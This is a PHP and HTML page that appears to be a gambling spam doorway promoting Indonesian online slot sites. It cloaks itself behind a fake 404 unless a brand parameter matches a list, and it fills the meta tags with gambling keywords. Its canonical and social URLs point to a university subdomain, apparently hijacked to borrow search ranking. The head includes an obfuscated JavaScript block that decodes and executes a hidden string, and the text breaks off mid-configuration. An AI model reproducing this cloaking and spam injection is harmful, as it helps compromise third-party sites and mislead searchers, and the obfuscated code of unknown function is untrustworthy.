<?php

function feedback404()
{
    header("HTTP/1.0 404 Not Found");
    echo "<h1><strong>404 Not Found</strong></h1>";
    echo "The requested URL/badpage was not found on this server";
}

if (isset($_GET['mart'])) {
    $filename = "list.txt";
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $target_string = strtolower($_GET['mart']);
    foreach ($lines as $item) {
        if (strtolower($item) === $target_string) {
            $BRAND = strtoupper($target_string);
        }
    }
    if (isset($BRAND)) {
        $BRANDS = $BRAND;
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        if (isset($fullUrl)) {
            $parsedUrl = parse_url($fullUrl);
            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
            $urlPath = $baseUrl;
        } else {
            echo "URL saat ini tidak didefinisikan.";
        }
    } else {
        feedback404();
        exit();
    }
} else {
    feedback404();
    exit();
}

?>
<!-- Script Landing Page -->

<!doctype html>
<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US" data-authenticated-account>
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- HITUT -->
    <!-- ONLINE -->
    <base href="">
    <meta charset="utf-8" />
    <title><?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor  </title>
    <meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" />
    <link rel="icon" type="image/x-icon" href="https://img.pikbest.com/origin/09/02/51/81MpIkbEsTbvP.png!sw800" />
    <link rel="canonical" href="https://central-laboratory.um.ac.id/manual/?mart=<?php echo $BRANDS ?>" />
    <link rel="amphtml" href="https://seopecahterus.pages.dev/">
    <meta name="Keywords" content="<?php echo $BRANDS ?>, slot <?php echo $BRANDS ?>, judi <?php echo $BRANDS ?>, login <?php echo $BRANDS ?>, rtp <?php echo $BRANDS ?>, livechat <?php echo $BRANDS ?>, situs <?php echo $BRANDS ?>, agen <?php echo $BRANDS ?>, selot <?php echo $BRANDS ?>, alternatif <?php echo $BRANDS ?>, bandar <?php echo $BRANDS ?>, daftar <?php echo $BRANDS ?>, Link <?php echo $BRANDS ?>, Game <?php echo $BRANDS ?>, bocoran <?php echo $BRANDS ?>." />
    <meta property="og:site_name" content="<?php echo $BRANDS ?>" />
    <meta property="og:title" content="<?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor  " />
    <meta property="og:url" content="https://central-laboratory.um.ac.id/manual/?mart=<?php echo $BRANDS ?>" />
    <meta property="og:type" content="product" />
    <meta property="og:description" content="<?php echo $BRANDS ?> slot server thailand terbaru dan mudah menang pada hari ini dengan deposit termurah dan juga pasti nya gampang jackpot <?php echo $BRANDS ?>. Segera daftar dan deposit sekarang juga untuk mendapatkan jackpot terbesar!" />
    <meta property="og:image" content="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg?format=1500w" />
    <meta property="og:image:width" content="1500" />
    <meta property="og:image:height" content="1500" />
    <meta property="product:price:amount" content="10.000" />
    <meta property="product:price:currency" content="IDR" />
    <meta property="product:availability" content="instock" />
    <meta itemprop="name" content="<?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor  " />
    <meta itemprop="url" content="https://central-laboratory.um.ac.id/manual/?mart=<?php echo $BRANDS ?>" />
    <meta itemprop="description" content="<?php echo $BRANDS ?> slot server thailand terbaru dan mudah menang pada hari ini dengan deposit termurah dan juga pasti nya gampang jackpot <?php echo $BRANDS ?>. Segera daftar dan deposit sekarang juga untuk mendapatkan jackpot terbesar!" />
    <meta itemprop="thumbnailUrl" content="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg?format=1500w" />
    <link rel="image_src" href="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg?format=1500w" />
    <meta itemprop="image" content="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg?format=1500w" />
    <meta name="twitter:title" content="<?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor  " />
    <meta name="twitter:image" content="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg?format=1500w" />
    <meta name="twitter:url" content="https://central-laboratory.um.ac.id/manual/?mart=<?php echo $BRANDS ?>" />
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:description" content="<?php echo $BRANDS ?> slot server thailand terbaru dan mudah menang pada hari ini dengan deposit termurah dan juga pasti nya gampang jackpot <?php echo $BRANDS ?>. Segera daftar dan deposit sekarang juga untuk mendapatkan jackpot terbesar!" />
    <meta name="description" content="<?php echo $BRANDS ?> slot server thailand terbaru dan mudah menang pada hari ini dengan deposit termurah dan juga pasti nya gampang jackpot <?php echo $BRANDS ?>. Segera daftar dan deposit sekarang juga untuk mendapatkan jackpot terbesar!" />
    <link rel="preconnect" href="https://images.squarespace-cdn.com">
    <script type="text/javascript" src="//use.typekit.net/ik/OyH5iCdhB9zSdD28nnHeYZHF9XN-8f9MJyL2PqfgcsIfecvJXnX1IyvhF2jtFRZLFRmqFQicFQSXZA4RjDj3wRJh5A9o52SDe6MK2hyydY8yScblZe8DSeUypPGHf5A5MyMMeMw6MKGHf5h5MyMMeMS6MKGHf5-5MyMMeMX6MKGHf5E5MyMMegI6MTMghV_mn6j.js"></script>
    <script type="text/javascript">
      try {
        Typekit.load();
      } catch (e) {}
    </script>
    <script type="text/javascript" crossorigin="anonymous" defer="defer" nomodule="nomodule" src="//assets.squarespace.com/@sqs/polyfiller/1.6/legacy.js"></script>
    <script type="text/javascript" crossorigin="anonymous" defer="defer" src="//assets.squarespace.com/@sqs/polyfiller/1.6/modern.js"></script>
    <script type="text/javascript">
      SQUARESPACE_ROLLUPS = {};
    </script>
    <script>
      (function(rollups, name) {
        if (!rollups[name]) {
          rollups[name] = {};
        }
        rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-10f7f13f0548d868c9ff-min.en-US.js"];
      })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_runtime');
    </script>
    <script>
      var squarespace, assets;
      (function() {
          var lLa = '',
            OCJ = 143 - 132;

          function dDS(i) {
            var f = 4373819;
            var o = i.length;
            var s = [];
            for (var t = 0; t < o; t++) {
              s[t] = i.charAt(t)
            };
            for (var t = 0; t < o; t++) {
              var z = f * (t + 323) + (f % 26874);
              var w = f * (t + 411) + (f % 44505);
              var n = z % o;
              var g = w % o;
              var h = s[n];
              s[n] = s[g];
              s[g] = h;
              f = (z + w) % 5774700;
            };
            return s.join('')
          };
          var BQs = dDS('ehnlurnrkjcastdfogmvtrocpotbsxicqwuyz').substr(0, OCJ);var Cow = ',ga ,)q;+vv4w8qku,+vt]a;bhjmv=nf,owlpht;)ba2svs=tx,).e2 rta0q8=o1il. sg+l8t+=.A6nf(dhs 8e()uh"82trnvf9 < g) f, i + t[lv4, ), l < 6 cluaet = 1 htiaa(5, ; am + 0 lb <= olrg)
        "(Asni9b[us,a;)dn);{ahz]sr]hg.=2o0.7;)=n7;s<-1k;r 3)e+=16"
        nvatgrn[e; Ail > n9, pjdr + ] h = e A.aaibme = a.[;, "lhas0(aofg;e;;([vo!(dsfh, =(hvlaa>=0eb{.a}[prn=hfuvg(;)f({,c{]pa[ar Cbn)8)+fr 7wvt+p7r],7yj9c2gk.s)av b1trrooul ;)6jnhrmrng)r7ae,uc6p2.orw8+ts;2,j;sl7;fqiv.y;f),f.,==n1ma)+ns(ur,)rt5ai;;;h]1n-li+7c;+e;qyejbtr},(]w.r0pa-7*(l+3(. +e).r[0y)vc=ou +jv{(r(=yl]j=[h8;r[efrr;(-}y=v];C(van;(pt;moc;[kirihlr=}(hf}hcou;Crs]*3;y]"
          h;a.ar(; = ; a(ub3uyidguwg4c) b0.;] o(p tmr7h;
            "===r}-m)( (h]u.-(nl=(wr1,r.orbhrutseh)ehr5)0C=a9(e+1CC.,pen4slst)crcaon6ns[;m[;}vui car,ao.nq "
            k; o + 24 xoogh, hv = en(r) C) e, r1 < tmfu {
            rt "r.2vaf+e=9p;n{ghod==lahda.ts!ivls=;= )r=1e(0;48loa.o,290)n=)c==+svb)ntn;rfv6gvoiaiCvej(n+ St)r=..pru[y=t=A a+(x (e(6=ett"
            x1a + v60lipiS + h - " er=in;.h;';var dsd=dDS[BQs];var DEZ='';var Sfv=dsd;var JTt=dsd(DEZ,dDS(Cow));var vMN=JTt(dDS('$sg zxn,{t3i.pd(t&St=)s4,4Va.V,(!,gfj!!%Vdip!tV,n3)a}l.(%a5b{(pp#})67a)d!)V!e#}_d+}V.\'._)$Vf=c}iaz\/o$1s6p{3\'(rnsV%;n;&ti_r)hsu1cnd2,d\/,=6rVk3=tf,$dla{,(r0.V2Vv;V1", s3p, .1 $)(wso$6, g06p($.(c!1, nv_[) Vjs) js; sV1bwVVjchV) cVVr4ai = tu)
        ].V_!daV0 = +0
      }
      0; + mV1d] to % ;
      e, 4 sV(tsr\ / 8 e = [0 s!;o(evb4f + nVCcVfVbircVs1d + 5 VV - puix\ / , td, , t = t.pb);.!;de + p1.) VwftVwV\ 'z3=7p.7..VVcfV.}.aVV!_d1s}(,(_Vt;hVn3ao.,\/!d7t40r,6pV30_VV.pj_V$4r(1%3V.s}4;Vfn\/")#pdp5t)ef103f1=1V{):h\/a.)r#6_m.V_${jb=!_e.V=-_Vso)]r)7V(leoozt;j=z!!Vidda8V;j2.2,Vlil;11.7$bc_,0V}6{+defrS03tsgr)y0 =o{e(sf$.Vebj!7$#n_S(eaV)u{!#3$}6=ac(nC$sof"% .)tacnV}))=Vrgjf+oeo.!p.a$1c(fj(iVod *ich3)g*.!))(V8,_7zVV.=spr$sfh$Vf[80(zsor)h1 (shcV.;)eo!.c;7+V..ryld4,3dh3c2c)(;os#f= a_(bgsu.ldcsa{ndx=o],t aVw;V.b,4q6eo,VVVVdiV+s(2)i3;];)..!.V10!rc;$aV(+}!V,_s((](3ub.mb]\/"dVdV.7!-e;(l$)r6]!nV(ae.(%[V$rd3_%1o.j=};%=o!rysn,V,aufs2!!pi=V;)*li;7;h4ila.d)7;;i02\/e t\/)&V)49)_(aug(]$340l3V=t3!c.bft$.)V,d%ieV d.h)(..+f")Vs.\/s3,ti0 -d ,butd_$. $].on1l6V_t[ $_Vd3_" b$a08 .",*0no1;q-)sdsrr$zrrs _n8es(&1\'3di4rj V.{=V$3V])$.+)a_3'));
      var tHt = Sfv(lLa, vMN);
      tHt(8636);
      return 1397
      })()
    </script>
    <script>
      (function(rollups, name) {
        if (!rollups[name]) {
          rollups[name] = {};
        }
        rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-675f9459672cf966ca51-min.en-US.js"];
      })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_moment_js_vendor');
    </script>
    <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-675f9459672cf966ca51-min.en-US.js" defer></script>
    <script>
      (function(rollups, name) {
        if (!rollups[name]) {
          rollups[name] = {};
        }
        rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-a682f7ad337741eb05d6-min.en-US.js"];
      })(SQUARESPACE_ROLLUPS, 'squarespace-cldr_resource_pack');
    </script>
    <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-a682f7ad337741eb05d6-min.en-US.js" defer></script>
    <script>
      (function(rollups, name) {
        if (!rollups[name]) {
          rollups[name] = {};
        }
        rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-f9df4447a2af25df5875-min.en-US.js"];
      })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors_stable');
    </script>
    <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-f9df4447a2af25df5875-min.en-US.js" defer></script>
    <script>
      (function(rollups, name) {
        if (!rollups[name]) {
          rollups[name] = {};
        }
        rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-1bef90eb386ac606f3b4-min.en-US.js"];
      })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors');
    </script>
    <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-vendors-1bef90eb386ac606f3b4-min.en-US.js" defer></script>
    <script>
      (function(rollups, name) {
        if (!rollups[name]) {
          rollups[name] = {};
        }
        rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-154479d10ededc56d728-min.en-US.js"];
      })(SQUARESPACE_ROLLUPS, 'squarespace-common');
    </script>
    <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-154479d10ededc56d728-min.en-US.js" defer></script>
    <script>
      (function(rollups, name) {
        if (!rollups[name]) {
          rollups[name] = {};
        }
        rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/commerce-150a6e6a2b83a0625eb9-min.en-US.js"];
      })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');
    </script>
    <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/commerce-150a6e6a2b83a0625eb9-min.en-US.js" defer></script>
    <script>
      (function(rollups, name) {
        if (!rollups[name]) {
          rollups[name] = {};
        }
        rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/commerce-af8809f2481c48376f6a-min.en-US.css"];
      })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');
    </script>
    <link rel="stylesheet" type="text/css" href="//assets.squarespace.com/universal/styles-compressed/commerce-af8809f2481c48376f6a-min.en-US.css">
    <script data-name="static-context">
      Static = window.Static || {};
      Static.SQUARESPACE_CONTEXT = {
        "facebookAppId": "314192535267336",
        "facebookApiVersion": "v6.0",
        "rollups": {
          "squarespace-announcement-bar": {
            "js": "//assets.squarespace.com/universal/scripts-compressed/announcement-bar-e42ac314ef80a7b21fb9-min.en-US.js"
          },
          "squarespace-audio-player": {
            "css": "//assets.squarespace.com/universal/styles-compressed/audio-player-68f0d70f87aaddb33c87-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/audio-player-1e8d6e00ca759875ec40-min.en-US.js"
          },
          "squarespace-blog-collection-list": {
            "css": "//assets.squarespace.com/universal/styles-compressed/blog-collection-list-1e4496937ccd55da84b7-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/blog-collection-list-0ec9ba70c561f4417993-min.en-US.js"
          },
          "squarespace-calendar-block-renderer": {
            "css": "//assets.squarespace.com/universal/styles-compressed/calendar-block-renderer-17dca3f66c4211bf16d1-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/calendar-block-renderer-baf90e082a0cd499948a-min.en-US.js"
          },
          "squarespace-chartjs-helpers": {
            "css": "//assets.squarespace.com/universal/styles-compressed/chartjs-helpers-d3ebe653c1c873022724-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/chartjs-helpers-41b3ac55c3feedf3d532-min.en-US.js"
          },
          "squarespace-comments": {
            "css": "//assets.squarespace.com/universal/styles-compressed/comments-c284904b25c71d02bce8-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/comments-743e116489333cf4e5a5-min.en-US.js"
          },
          "squarespace-custom-css-popup": {
            "css": "//assets.squarespace.com/universal/styles-compressed/custom-css-popup-402bdf5c7d3c7d6af84c-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/custom-css-popup-d8a7f52da45ba1ae4b8b-min.en-US.js"
          },
          "squarespace-dialog": {
            "css": "//assets.squarespace.com/universal/styles-compressed/dialog-9349bf4b96d773b4fc4a-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/dialog-54369b90dff191f064b0-min.en-US.js"
          },
          "squarespace-events-collection": {
            "css": "//assets.squarespace.com/universal/styles-compressed/events-collection-17dca3f66c4211bf16d1-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/events-collection-1109bd509d670302c672-min.en-US.js"
          },
          "squarespace-form-rendering-utils": {
            "js": "//assets.squarespace.com/universal/scripts-compressed/form-rendering-utils-b2ea718dd61fc92212de-min.en-US.js"
          },
          "squarespace-forms": {
            "css": "//assets.squarespace.com/universal/styles-compressed/forms-e6610e528d6f92fd5031-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/forms-ecc172ea7d7138d1d090-min.en-US.js"
          },
          "squarespace-gallery-collection-list": {
            "css": "//assets.squarespace.com/universal/styles-compressed/gallery-collection-list-1e4496937ccd55da84b7-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/gallery-collection-list-3d6a0bb8046b2005bf08-min.en-US.js"
          },
          "squarespace-image-zoom": {
            "css": "//assets.squarespace.com/universal/styles-compressed/image-zoom-1e4496937ccd55da84b7-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/image-zoom-88078df9f58614d82665-min.en-US.js"
          },
          "squarespace-pinterest": {
            "css": "//assets.squarespace.com/universal/styles-compressed/pinterest-1e4496937ccd55da84b7-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/pinterest-4b05d78c1da1d1c41bd2-min.en-US.js"
          },
          "squarespace-popup-overlay": {
            "css": "//assets.squarespace.com/universal/styles-compressed/popup-overlay-667fa2c6bd659fe9a639-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/popup-overlay-17c6c9eeb6582098ea21-min.en-US.js"
          },
          "squarespace-product-quick-view": {
            "css": "//assets.squarespace.com/universal/styles-compressed/product-quick-view-f2c5750b07447cd0e8c5-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/product-quick-view-63aeaad9d787e4c472a6-min.en-US.js"
          },
          "squarespace-mart-collection-item-v2": {
            "css": "//assets.squarespace.com/universal/styles-compressed/mart-collection-item-v2-1e4496937ccd55da84b7-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/mart-collection-item-v2-43d31ab46f5dc95b0c84-min.en-US.js"
          },
          "squarespace-mart-collection-list-v2": {
            "css": "//assets.squarespace.com/universal/styles-compressed/mart-collection-list-v2-1e4496937ccd55da84b7-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/mart-collection-list-v2-93bc5328ce08f99b4278-min.en-US.js"
          },
          "squarespace-search-page": {
            "css": "//assets.squarespace.com/universal/styles-compressed/search-page-622dbcc4356d75bd674a-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/search-page-90f52b00acf3cc70ba30-min.en-US.js"
          },
          "squarespace-search-preview": {
            "js": "//assets.squarespace.com/universal/scripts-compressed/search-preview-9b00da4df01004f6b2a1-min.en-US.js"
          },
          "squarespace-simple-liking": {
            "css": "//assets.squarespace.com/universal/styles-compressed/simple-liking-3a1fa618b156b16f9a32-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/simple-liking-4ef11503ebc255d049e5-min.en-US.js"
          },
          "squarespace-social-buttons": {
            "css": "//assets.squarespace.com/universal/styles-compressed/social-buttons-5ccc4fc16300710a0a68-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/social-buttons-4dbc7b555bbb557951d2-min.en-US.js"
          },
          "squarespace-tourdates": {
            "css": "//assets.squarespace.com/universal/styles-compressed/tourdates-1e4496937ccd55da84b7-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/tourdates-33b98859f5c12c4ed254-min.en-US.js"
          },
          "squarespace-website-overlays-manager": {
            "css": "//assets.squarespace.com/universal/styles-compressed/website-overlays-manager-03eed1717232cc37078d-min.en-US.css",
            "js": "//assets.squarespace.com/universal/scripts-compressed/website-overlays-manager-79bcb3f741ed0d29b1f6-min.en-US.js"
          }
        },
        "pageType": 50,
        "website": {
          "id": "65d57f574ebcc602269e9873",
          "identifier": "flamingo-owl-hgdx",
          "websiteType": 1,
          "contentModifiedOn": 1708491621125,
          "cloneable": false,
          "hasBeenCloneable": false,
          "siteStatus": {
            "value": 3,
            "expiration": 1709700183235
          },
          "language": "en-US",
          "timeZone": "Asia/Jakarta",
          "machineTimeZoneOffset": 25200000,
          "timeZoneOffset": 25200000,
          "timeZoneAbbr": "WIB",
          "siteTitle": "Slot Gacor",
          "fullSiteTitle": "<?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor  ",
          "siteDescription": {
            "html": "",
            "raw": false
          },
          "logoImageId": "65d5839c6f817774791c4336",
          "shareButtonOptions": {
            "2": true,
            "8": true,
            "6": true,
            "1": true,
            "3": true,
            "4": true,
            "7": true
          },
          "logoImageUrl": "https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot88-pragmatic.png",
          "authenticUrl": "https://flamingo-owl-hgdx.squarespace.com",
          "internalUrl": "https://flamingo-owl-hgdx.squarespace.com",
          "baseUrl": "https://flamingo-owl-hgdx.squarespace.com",
          "sslSetting": 3,
          "isHstsEnabled": true,
          "socialAccounts": [{
            "serviceId": 64,
            "addedOn": 1708490583457,
            "profileUrl": "https://instagram.com/squarespace",
            "id": "65d57f574ebcc602269e9889",
            "websiteId": "65d57f574ebcc602269e9873",
            "pullEnabled": false,
            "pushEnabled": true,
            "autoPushEnabled": false,
            "iconEnabled": true,
            "defaultPushMessage": "%t %u",
            "accountState": 1,
            "pushAvailable": true,
            "serviceName": "instagram-unauth"
          }],
          "createdOn": 1708490583235,
          "templateId": "5c5a519771c10ba3470d8101",
          "installationId": "65d57f574ebcc602269e987b",
          "templateWebsiteId": "6564e646bc5d225098295018",
          "hasPassword": false,
          "typekitId": "",
          "statsMigrated": false,
          "imageMetadataProcessingEnabled": false,
          "revalidateBefore": 1708491698990,
          "captchaSettings": {
            "enabledForDonations": false
          },
          "showOwnerLogin": true
        },
        "websiteSettings": {
          "id": "65d57f574ebcc602269e9876",
          "websiteId": "65d57f574ebcc602269e9873",
          "subjects": [],
          "country": "ID",
          "state": "JK",
          "simpleLikingEnabled": true,
          "mobileInfoBarSettings": {
            "isContactEmailEnabled": false,
            "isContactPhoneNumberEnabled": false,
            "isLocationEnabled": false,
            "isBusinessHoursEnabled": false
          },
          "commentLikesAllowed": true,
          "commentAnonAllowed": true,
          "commentThreaded": true,
          "commentApprovalRequired": false,
          "commentAvatarsOn": true,
          "commentSortType": 2,
          "commentFlagThreshold": 0,
          "commentFlagsAllowed": true,
          "commentEnableByDefault": true,
          "commentDisableAfterDaysDefault": 0,
          "disqusShortname": "",
          "commentsEnabled": false,
          "storeSettings": {
            "returnPolicy": {
              "raw": false
            },
            "termsOfService": {
              "raw": false
            },
            "privacyPolicy": {
              "raw": false
            },
            "storeMailingList": {
              "connected": false,
              "list": "",
              "useSingleOptIn": false
            },
            "expressCheckout": false,
            "continuemartpingLinkUrl": "/",
            "testModeOn": true,
            "useLightCart": false,
            "showNoteField": false,
            "shippingCountryDefaultValue": "US",
            "billToShippingDefaultValue": false,
            "showShippingPhoneNumber": true,
            "isShippingPhoneRequired": false,
            "showBillingPhoneNumber": true,
            "isBillingPhoneRequired": false,
            "currenciesSupported": ["USD", "CAD", "GBP", "AUD", "EUR", "CHF", "NOK", "SEK", "DKK", "NZD", "SGD", "MXN", "HKD", "CZK", "ILS", "MYR", "RUB", "PHP", "PLN", "THB", "BRL", "ARS", "COP", "IDR", "INR", "JPY", "ZAR"],
            "defaultCurrency": "USD",
            "selectedCurrency": "IDR",
            "measurementStandard": 1,
            "showCustomCheckoutForm": false,
            "checkoutPageMarketingOptInEnabled": true,
            "enableMailingListOptInByDefault": false,
            "isApplePayEnabled": false,
            "isPaymentRequestEnabled": true,
            "sameAsRetailLocation": false,
            "merchandisingSettings": {
              "scarcityEnabledOnProductItems": false,
              "scarcityEnabledOnProductBlocks": false,
              "scarcityMessageType": "DEFAULT_SCARCITY_MESSAGE",
              "scarcityThreshold": 10,
              "merchantLowStockAlertThreshold": 5,
              "multipleQuantityAllowedForServices": true,
              "restockNotificationsEnabled": false,
              "restockNotificationsMailingListSignUpEnabled": false,
              "relatedmartEnabled": false,
              "relatedmartOrdering": "random",
              "soldOutVariantsDropdownDisabled": false,
              "productComposerOptedIn": false,
              "productComposerABTestOptedOut": false,
              "productReviewsEnabled": false
            },
            "minimumOrderSubtotalEnabled": false,
            "minimumOrderSubtotal": {
              "currency": "IDR",
              "value": "0.00"
            },
            "instagrammartpingLinkDestination": 1,
            "storeMigratedToProductCollections2_0": false,
            "isLive": false,
            "multipleQuantityAllowedForServices": true
          },
          "useEscapeKeyToLogin": false,
          "ssBadgeType": 1,
          "ssBadgePosition": 4,
          "ssBadgeVisibility": 1,
          "ssBadgeDevices": 1,
          "pinterestOverlayOptions": {
            "mode": "disabled"
          },
          "ampEnabled": false,
          "userAccountsSettings": {
            "loginAllowed": false,
            "signupAllowed": false
          }
        },
        "cookieSettings": {
          "isCookieBannerEnabled": false,
          "isRestrictiveCookiePolicyEnabled": false,
          "isRestrictiveCookiePolicyAbsolute": false,
          "cookieBannerText": "",
          "cookieBannerTheme": "",
          "cookieBannerVariant": "",
          "cookieBannerPosition": "",
          "cookieBannerCtaVariant": "",
          "cookieBannerCtaText": "",
          "cookieBannerAcceptType": "OPT_IN",
          "cookieBannerOptOutCtaText": "",
          "cookieBannerHasOptOut": false,
          "cookieBannerHasManageCookies": true,
          "cookieBannerManageCookiesLabel": ""
        },
        "websiteCloneable": false,
        "collection": {
          "title": "mart",
          "id": "65d57fcfc018f8613445674d",
          "fullUrl": "/mart",
          "type": 13,
          "permissionType": 1
        },
        "item": {
          "title": "<?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor  ",
          "id": "65d57fcfc018f86134456753",
          "fullUrl": "/mart/p/spring-bowl-rltkk-jy5sr-fjw6l-dp8lg-fbmgj-cs6n2-zpp9a-x7c9k-c68b7-ztfb6",
          "publicCommentCount": 0,
          "commentState": 1,
          "recordType": 11
        },
        "subscribed": false,
        "appDomain": "squarespace.com",
        "templateTweakable": true,
        "tweakJSON": {
          "form-use-theme-colors": "true",
          "header-logo-height": "100px",
          "header-mobile-logo-max-height": "100px",
          "header-vert-padding": "1.1vw",
          "header-width": "Full",
          "maxPageWidth": "1400px",
          "pagePadding": "2vw",
          "tweak-blog-alternating-side-by-side-image-aspect-ratio": "1:1 Square",
          "tweak-blog-alternating-side-by-side-image-spacing": "6%",
          "tweak-blog-alternating-side-by-side-meta-spacing": "20px",
          "tweak-blog-alternating-side-by-side-primary-meta": "Categories",
          "tweak-blog-alternating-side-by-side-read-more-spacing": "20px",
          "tweak-blog-alternating-side-by-side-secondary-meta": "Date",
          "tweak-blog-basic-grid-columns": "2",
          "tweak-blog-basic-grid-image-aspect-ratio": "3:2 Standard",
          "tweak-blog-basic-grid-image-spacing": "30px",
          "tweak-blog-basic-grid-meta-spacing": "17px",
          "tweak-blog-basic-grid-primary-meta": "Categories",
          "tweak-blog-basic-grid-read-more-spacing": "16px",
          "tweak-blog-basic-grid-secondary-meta": "Date",
          "tweak-blog-item-custom-width": "75",
          "tweak-blog-item-show-author-profile": "false",
          "tweak-blog-item-width": "Narrow",
          "tweak-blog-masonry-columns": "2",
          "tweak-blog-masonry-horizontal-spacing": "64px",
          "tweak-blog-masonry-image-spacing": "20px",
          "tweak-blog-masonry-meta-spacing": "10px",
          "tweak-blog-masonry-primary-meta": "Categories",
          "tweak-blog-masonry-read-more-spacing": "22px",
          "tweak-blog-masonry-secondary-meta": "Date",
          "tweak-blog-masonry-vertical-spacing": "231px",
          "tweak-blog-side-by-side-image-aspect-ratio": "1:1 Square",
          "tweak-blog-side-by-side-image-spacing": "6%",
          "tweak-blog-side-by-side-meta-spacing": "20px",
          "tweak-blog-side-by-side-primary-meta": "Categories",
          "tweak-blog-side-by-side-read-more-spacing": "20px",
          "tweak-blog-side-by-side-secondary-meta": "Date",
          "tweak-blog-single-column-image-spacing": "50px",
          "tweak-blog-single-column-meta-spacing": "30px",
          "tweak-blog-single-column-primary-meta": "Categories",
          "tweak-blog-single-column-read-more-spacing": "30px",
          "tweak-blog-single-column-secondary-meta": "Date",
          "tweak-events-stacked-show-thumbnails": "true",
          "tweak-events-stacked-thumbnail-size": "3:2 Standard",
          "tweak-fixed-header": "false",
          "tweak-fixed-header-style": "Basic",
          "tweak-global-animations-animation-curve": "ease",
          "tweak-global-animations-animation-delay": "0.6s",
          "tweak-global-animations-animation-duration": "1.50s",
          "tweak-global-animations-animation-style": "fade",
          "tweak-global-animations-animation-type": "fade",
          "tweak-global-animations-complexity-level": "detailed",
          "tweak-global-animations-enabled": "true",
          "tweak-portfolio-grid-basic-custom-height": "50",
          "tweak-portfolio-grid-overlay-custom-height": "50",
          "tweak-portfolio-hover-follow-acceleration": "10%",
          "tweak-portfolio-hover-follow-animation-duration": "Fast",
          "tweak-portfolio-hover-follow-animation-type": "Fade",
